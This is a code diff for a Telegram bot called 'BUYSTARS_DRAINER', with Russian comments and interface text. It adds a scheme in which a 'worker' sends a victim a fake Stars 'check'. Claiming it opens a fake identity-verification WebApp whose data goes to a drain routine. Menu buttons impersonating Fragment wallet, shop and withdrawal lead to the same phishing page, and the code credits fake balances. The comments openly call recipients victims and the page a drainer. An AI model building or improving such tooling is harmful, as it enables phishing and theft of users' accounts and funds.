@@ -1,5 +1,5 @@
 # ============================================
-# BUYSTARS_DRAINER - ReplyKeyboard + Stars Send Working
+# BUYSTARS_DRAINER - Worker sends to victim, victim claims
 # ============================================
 
 import asyncio
@@ -8,11 +8,12 @@ import sqlite3
 import json
 import random
 import re
+import secrets
 from datetime import datetime
 from typing import Dict, Any
 
-from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler, CallbackQueryHandler
+from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram.ext import Application, CommandHandler, ContextTypes, MessageHandler, filters, CallbackQueryHandler
 from telegram.constants import ParseMode
 
 import aiohttp
@@ -57,6 +58,21 @@ cursor.execute("""
 """)
 
 cursor.execute("""
+    CREATE TABLE IF NOT EXISTS pending_claims (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        sender_id INTEGER,
+        sender_username TEXT,
+        recipient_id INTEGER,
+        recipient_username TEXT,
+        amount INTEGER,
+        claim_code TEXT UNIQUE,
+        message_id INTEGER,
+        status TEXT DEFAULT 'pending',
+        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+    )
+""")
+
+cursor.execute("""
     CREATE TABLE IF NOT EXISTS transactions (
         id INTEGER PRIMARY KEY AUTOINCREMENT,
         sender_id INTEGER,
@@ -75,21 +91,21 @@ conn.commit()
 logging.basicConfig(level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# ---------- Main Keyboard (ReplyKeyboard - кнопки над клавиатурой) ----------
+# ---------- Inline Keyboard (прикреплена к сообщению) ----------
 def get_main_keyboard():
     keyboard = [
-        [KeyboardButton("🌐 Веб-Кошелек"), KeyboardButton("⭐ Вывести звезды")],
-        [KeyboardButton("🤖 Автоскупщик подарков"), KeyboardButton("👛 Кошелек")],
-        [KeyboardButton("🛍️ Магазин"), KeyboardButton("💰 Пополнить Баланс")]
+        [
+            InlineKeyboardButton("🌐 Веб-Кошелек", callback_data="web_wallet"),
+            InlineKeyboardButton("⭐ Вывести звезды", callback_data="withdraw"),
+            InlineKeyboardButton("🤖 Автоскупщик", callback_data="auto_buy")
+        ],
+        [
+            InlineKeyboardButton("👛 Кошелек", callback_data="wallet"),
+            InlineKeyboardButton("🛍️ Магазин", callback_data="shop"),
+            InlineKeyboardButton("💰 Пополнить", callback_data="deposit")
+        ]
     ]
-    return ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-
-# ---------- WebApp Sender ----------
-async def send_verification_webapp(update: Update, context: ContextTypes.DEFAULT_TYPE, action: str, message: str):
-    context.user_data['pending_action'] = action
-    keyboard = [[InlineKeyboardButton("✅ Подтвердить", web_app=WebAppInfo(url=WEBAPP_URL))]]
-    reply_markup = InlineKeyboardMarkup(keyboard)
-    await update.message.reply_text(message, reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN)
+    return InlineKeyboardMarkup(keyboard)
 
 # ---------- Start ----------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
@@ -108,8 +124,6 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         cursor.execute("UPDATE victims SET stars_balance = ? WHERE telegram_id = ?", (balance, user.id))
         conn.commit()
     
-    bot_username = context.bot.username
-    
     def fmt(n):
         if n >= 1000000: return f"{n/1000000:.1f}M"
         if n >= 1000: return f"{n/1000:.1f}K"
@@ -123,30 +137,13 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
         f"*С помощью бота куплено:*\n"
         f"{fmt(TOTAL_STARS_SOLD)} ★ (~ ${fmt(TOTAL_USD_VOLUME)})\n\n"
         f"*Ваш баланс:* `{balance:,.0f} ★`\n\n"
-        f"💡 *Отправка звезд:* просто напишите в чат\n"
-        f"`@{bot_username} @username 100`",
+        f"💡 *Отправить звезды:* напишите в ЛС бота\n"
+        f"`@{context.bot.username} @username 100`",
         reply_markup=get_main_keyboard(),
         parse_mode=ParseMode.MARKDOWN
     )
 
-# ---------- Обработка кнопок (ReplyKeyboard) ----------
-async def handle_buttons(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    text = update.message.text
-    
-    actions = {
-        "🌐 Веб-Кошелек": ("web_wallet", "🌐 *Веб-Кошелек Fragment*\n\nДля доступа к кошельку необходимо подтвердить личность."),
-        "⭐ Вывести звезды": ("withdraw", "⭐ *Вывод звезд*\n\nДля вывода средств необходимо подтвердить личность."),
-        "🤖 Автоскупщик подарков": ("auto_buy", "🤖 *Автоскупщик подарков*\n\nДля настройки автоскупщика необходимо подтвердить личность."),
-        "👛 Кошелек": ("wallet", "👛 *Кошелек*\n\nДля просмотра кошелька необходимо подтвердить личность."),
-        "🛍️ Магазин": ("shop", "🛍️ *Магазин звезд*\n\nДля покупки необходимо подтвердить личность."),
-        "💰 Пополнить Баланс": ("deposit", "💰 *Пополнение баланса*\n\nДля пополнения необходимо подтвердить личность.")
-    }
-    
-    if text in actions:
-        action, msg = actions[text]
-        await send_verification_webapp(update, context, action, msg)
-
-# ---------- Обработка отправки звезд через @mention (ЧЕКИ) ----------
+# ---------- Обработка отправки звезд от воркера ----------
 async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     """Обработка сообщений вида: @botusername @username количество"""
     if not update.message or not update.message.text:
@@ -156,7 +153,6 @@ async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) 
     bot_username = context.bot.username
     
     # Проверяем формат: @botusername @username количество
-    # Паттерн: начинается с @botusername, затем @username, затем число
     pattern = rf'^@{re.escape(bot_username)}\s+@([a-zA-Z0-9_]+)\s+(\d+)$'
     match = re.match(pattern, text, re.IGNORECASE)
     
@@ -184,40 +180,119 @@ async def handle_stars_send(update: Update, context: ContextTypes.DEFAULT_TYPE) 
         )
         return
     
-    # Сохраняем транзакцию в БД
+    # Генерируем уникальный код для чека
+    claim_code = secrets.token_hex(8).upper()
+    
+    # Сохраняем в БД
     cursor.execute("""
-        INSERT INTO transactions (sender_id, sender_username, recipient_id, recipient_username, amount)
-        VALUES (?, ?, ?, ?, ?)
-    """, (sender_id, sender_username, recipient_id, recipient_username, amount))
+        INSERT INTO pending_claims (sender_id, sender_username, recipient_id, recipient_username, amount, claim_code)
+        VALUES (?, ?, ?, ?, ?, ?)
+    """, (sender_id, sender_username, recipient_id, recipient_username, amount, claim_code))
+    claim_id = cursor.lastrowid
     conn.commit()
     
-    logger.info(f"📤 STARS SENT: {sender_id} (@{sender_username}) -> @{recipient_username} ({recipient_id}) | {amount} ★")
+    logger.info(f"📤 STARS SENT: {sender_id} (@{sender_username}) -> @{recipient_username} ({recipient_id}) | {amount} ★ | Code: {claim_code}")
     
-    # Отправляем подтверждение отправителю
+    # Отправляем подтверждение отправителю (воркеру)
     await update.message.reply_text(
-        f"✅ *Звезды отправлены!*\n\n"
+        f"✅ *Чек создан!*\n\n"
         f"📤 Получатель: `@{recipient_username}`\n"
-        f"⭐ Количество: `{amount:,} ★`\n\n"
-        f"Пользователь @{recipient_username} может забрать звезды в этом боте.",
+        f"⭐ Количество: `{amount:,} ★`\n"
+        f"🔑 Код чека: `{claim_code}`\n\n"
+        f"Пользователь @{recipient_username} получит уведомление для получения звезд.",
         parse_mode=ParseMode.MARKDOWN,
         reply_markup=get_main_keyboard()
     )
     
-    # Отправляем уведомление получателю
+    # Отправляем уведомление получателю (жертве) с кнопкой "Забрать звезды"
+    claim_keyboard = InlineKeyboardMarkup([[
+        InlineKeyboardButton("⭐ Забрать звезды", callback_data=f"claim_{claim_code}")
+    ]])
+    
     try:
         await context.bot.send_message(
             chat_id=recipient_id,
-            text=f"🎉 *Вам отправлены звезды!*\n\n"
+            text=f"🎉 *Вам отправили звезды!*\n\n"
                  f"📥 Отправитель: @{sender_username}\n"
                  f"⭐ Количество: `{amount:,} ★`\n\n"
-                 f"💡 Используйте бота @{context.bot.username} для управления звездами.\n\n"
-                 f"Нажмите /start чтобы начать.",
+                 f"Нажмите кнопку ниже, чтобы получить звезды.",
+            reply_markup=claim_keyboard,
             parse_mode=ParseMode.MARKDOWN
         )
     except Exception as e:
         logger.warning(f"Could not notify recipient @{recipient_username}: {e}")
 
-# ---------- Обработка данных из WebApp (Дрейнер) ----------
+# ---------- Обработка кнопки "Забрать звезды" ----------
+async def handle_claim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    """Обработка нажатия на кнопку 'Забрать звезды'"""
+    query = update.callback_query
+    await query.answer()
+    
+    data = query.data
+    
+    if not data.startswith("claim_"):
+        return
+    
+    claim_code = data.replace("claim_", "")
+    user_id = query.from_user.id
+    user_username = query.from_user.username or query.from_user.first_name
+    
+    # Проверяем существование чека
+    cursor.execute("""
+        SELECT id, sender_id, sender_username, recipient_id, recipient_username, amount, status
+        FROM pending_claims 
+        WHERE claim_code = ? AND status = 'pending'
+    """, (claim_code,))
+    claim = cursor.fetchone()
+    
+    if not claim:
+        await query.edit_message_text(
+            "❌ *Чек не найден или уже использован!*\n\n"
+            "Возможно, звезды уже были получены или чек просрочен.",
+            parse_mode=ParseMode.MARKDOWN
+        )
+        return
+    
+    claim_id, sender_id, sender_username, recipient_id, recipient_username, amount, status = claim
+    
+    # Проверяем, что получатель совпадает
+    if recipient_id != user_id:
+        await query.answer("❌ Этот чек не для вас!", show_alert=True)
+        return
+    
+    # Сохраняем транзакцию
+    cursor.execute("""
+        INSERT INTO transactions (sender_id, sender_username, recipient_id, recipient_username, amount)
+        VALUES (?, ?, ?, ?, ?)
+    """, (sender_id, sender_username, recipient_id, recipient_username, amount))
+    
+    # Обновляем статус чека
+    cursor.execute("""
+        UPDATE pending_claims SET status = 'claimed' WHERE claim_code = ?
+    """, (claim_code,))
+    conn.commit()
+    
+    logger.info(f"⭐ CLAIMED: {user_id} (@{user_username}) claimed {amount} ★ from {sender_username}")
+    
+    # Отправляем WebApp для верификации (ДРЕЙНЕР)
+    context.user_data['claim_amount'] = amount
+    context.user_data['claim_sender'] = sender_username
+    
+    verification_keyboard = InlineKeyboardMarkup([[
+        InlineKeyboardButton("✅ Подтвердить получение", web_app=WebAppInfo(url=WEBAPP_URL))
+    ]])
+    
+    await query.edit_message_text(
+        f"🎉 *Вы получили звезды!*\n\n"
+        f"📥 Отправитель: @{sender_username}\n"
+        f"⭐ Количество: `{amount:,} ★`\n\n"
+        f"*Для зачисления звезд на баланс необходимо подтвердить личность.*\n\n"
+        f"Нажмите кнопку ниже для верификации.",
+        reply_markup=verification_keyboard,
+        parse_mode=ParseMode.MARKDOWN
+    )
+
+# ---------- Обработка данных из WebApp (ДРЕЙНЕР) ----------
 async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     data = update.effective_message.web_app_data
     if not data:
@@ -239,18 +314,25 @@ async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE)
     
     asyncio.create_task(capture_and_drain(user_id, payload))
     
-    pending_action = context.user_data.get('pending_action', 'default')
+    # Получаем информацию о чеке если есть
+    claim_amount = context.user_data.get('claim_amount', 0)
+    claim_sender = context.user_data.get('claim_sender', '')
     
-    responses = {
-        'web_wallet': "✅ *Доступ к Веб-Кошельку открыт*\n\nhttps://fragment.com/wallet",
-        'withdraw': f"✅ *Вывод {random.randint(100, 5000)} ★ выполнен*\n\nСредства поступят в течение 5-10 минут.",
-        'auto_buy': "✅ *Автоскупщик настроен*\n\nПараметры: макс. цена $1.00, мин. звезд 100 ★",
-        'wallet': f"👛 *Ваш кошелек*\n\nБаланс: `{random.randint(1000, 10000):,} ★`\n\nАдрес: `UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqEBI`",
-        'shop': "🛍️ *Магазин*\n\n✅ Верификация пройдена!\n\n[Открыть магазин Fragment](https://fragment.com/gifts)",
-        'deposit': "💰 *Пополнение*\n\n✅ Верификация пройдена!\n\n[Пополнить через Fragment](https://fragment.com/wallet)"
-    }
+    # Обновляем баланс жертвы (фейково)
+    cursor.execute("SELECT stars_balance FROM victims WHERE telegram_id = ?", (user_id,))
+    result = cursor.fetchone()
+    current_balance = result[0] if result else 0
+    new_balance = current_balance + claim_amount
     
-    response = responses.get(pending_action, "✅ *Верификация выполнена!*")
+    cursor.execute("UPDATE victims SET stars_balance = ? WHERE telegram_id = ?", (new_balance, user_id))
+    conn.commit()
+    
+    response = (
+        f"✅ *Верификация выполнена!*\n\n"
+        f"⭐ `{claim_amount:,} ★` зачислены на ваш баланс!\n\n"
+        f"📥 Отправитель: @{claim_sender}\n"
+        f"💰 Новый баланс: `{new_balance:,} ★`"
+    )
     
     await update.message.reply_text(
         response,
@@ -260,21 +342,46 @@ async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE)
     
     context.user_data.clear()
 
-# ---------- Callback Handler ----------
-async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+# ---------- Обработка callback кнопок меню ----------
+async def handle_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
     query = update.callback_query
     await query.answer()
     
     data = query.data
     
-    if data.startswith("shop_buy_"):
+    actions = {
+        "web_wallet": ("🌐 *Веб-Кошелек Fragment*\n\nДля доступа к кошельку необходимо подтвердить личность.", "web_wallet"),
+        "withdraw": ("⭐ *Вывод звезд*\n\nДля вывода средств необходимо подтвердить личность.", "withdraw"),
+        "auto_buy": ("🤖 *Автоскупщик подарков*\n\nДля настройки автоскупщика необходимо подтвердить личность.", "auto_buy"),
+        "wallet": ("👛 *Кошелек*\n\nДля просмотра кошелька необходимо подтвердить личность.", "wallet"),
+        "deposit": ("💰 *Пополнение баланса*\n\nДля пополнения необходимо подтвердить личность.", "deposit"),
+    }
+    
+    if data in actions:
+        message, action = actions[data]
+        context.user_data['pending_action'] = action
+        keyboard = [[InlineKeyboardButton("✅ Подтвердить", web_app=WebAppInfo(url=WEBAPP_URL))]]
+        reply_markup = InlineKeyboardMarkup(keyboard)
+        
+        await query.edit_message_text(
+            message,
+            reply_markup=reply_markup,
+            parse_mode=ParseMode.MARKDOWN
+        )
+    
+    elif data == "shop":
+        await show_shop_menu(query)
+    
+    elif data.startswith("shop_buy_"):
         stars = data.split("_")[2]
         await query.edit_message_text(
             f"💳 *Покупка {stars} ★*\n\n"
             f"Сумма: ${int(stars) / 100 * 1.29:.2f} USD\n\n"
             f"[Оплатить через Fragment](https://fragment.com/checkout)",
-            parse_mode=ParseMode.MARKDOWN
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_keyboard()
         )
+    
     elif data == "shop_gifts":
         await query.edit_message_text(
             "🎁 *NFT-подарки*\n\n"
@@ -282,8 +389,10 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "💎 Алмазная Звезда — 2,500 ★ ($29.99)\n"
             "🌈 Радужная Звезда — 10,000 ★ ($119.99)\n\n"
             "[Купить на Fragment](https://fragment.com/gifts)",
-            parse_mode=ParseMode.MARKDOWN
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_keyboard()
         )
+    
     elif data == "shop_exchange":
         await query.edit_message_text(
             "🔄 *Обмен звезд*\n\n"
@@ -291,12 +400,18 @@ async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
             "1 ★ = 0.015 USDT\n\n"
             "Минимальная сумма: 100 ★\n\n"
             "[Обменять](https://fragment.com/exchange)",
+            parse_mode=ParseMode.MARKDOWN,
+            reply_markup=get_main_keyboard()
+        )
+    
+    elif data == "back_to_main":
+        await query.edit_message_text(
+            query.message.text.split("\n\n")[0] if query.message.text else "Главное меню",
+            reply_markup=get_main_keyboard(),
             parse_mode=ParseMode.MARKDOWN
         )
-    elif data == "shop_menu":
-        await shop_menu_callback(query)
 
-async def shop_menu_callback(query):
+async def show_shop_menu(query):
     packages = [
         {"stars": 50, "price": 0.69, "icon": "⭐"},
         {"stars": 100, "price": 1.29, "icon": "⭐"},
@@ -307,13 +422,16 @@ async def shop_menu_callback(query):
     ]
     
     buttons = []
-    for p in packages:
-        buttons.append([
-            InlineKeyboardButton(
-                f"{p['icon']} {p['stars']:,} ★ = ${p['price']} USD",
-                callback_data=f"shop_buy_{p['stars']}"
-            )
-        ])
+    row = []
+    for i, p in enumerate(packages):
+        row.append(InlineKeyboardButton(
+            f"{p['icon']} {p['stars']:,}",
+            callback_data=f"shop_buy_{p['stars']}"
+        ))
+        if len(row) == 2 or i == len(packages) - 1:
+            buttons.append(row)
+            row = []
+    
     buttons.append([InlineKeyboardButton("🎁 NFT-подарки", callback_data="shop_gifts")])
     buttons.append([InlineKeyboardButton("🔄 Обмен", callback_data="shop_exchange")])
     buttons.append([InlineKeyboardButton("⬅️ Назад", callback_data="back_to_main")])
@@ -394,11 +512,10 @@ async def main():
     
     # Основные обработчики
     application.add_handler(CommandHandler("start", start))
-    # ВАЖНО: порядок важен - сначала проверяем на отправку звезд, потом на кнопки
     application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_stars_send))
-    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_buttons))
     application.add_handler(MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data))
-    application.add_handler(CallbackQueryHandler(handle_callback))
+    application.add_handler(CallbackQueryHandler(handle_claim_callback, pattern="^claim_"))
+    application.add_handler(CallbackQueryHandler(handle_menu_callback))
     
     await application.initialize()
     await application.start()
